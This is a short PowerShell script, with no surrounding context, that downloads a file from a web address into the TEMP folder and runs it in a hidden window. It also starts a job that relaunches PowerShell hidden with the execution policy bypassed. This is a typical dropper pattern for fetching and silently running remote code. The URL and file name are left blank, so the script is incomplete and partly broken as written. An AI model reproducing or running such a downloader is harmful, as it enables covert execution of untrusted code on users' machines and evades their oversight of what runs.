$batUrl = "t" 
$batPath = [System.IO.Path]::Combine($env:TEMP, "") 
iwr -Uri $batUrl -OutFile $batPath 
 
$psScript = { 
    Start-Process -FilePath powershell -ArgumentList "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$($MyInvocation.MyCommand.Path)`"" -Wait 
} 
 
$psJob = Start-Job -ScriptBlock $psScript 
 
if (Test-Path $batPath) { 
    Start-Process -FilePath $batPath -WindowStyle Hidden 
} 
 
$psJob | Wait-Job 
$psJob | Remove-Job
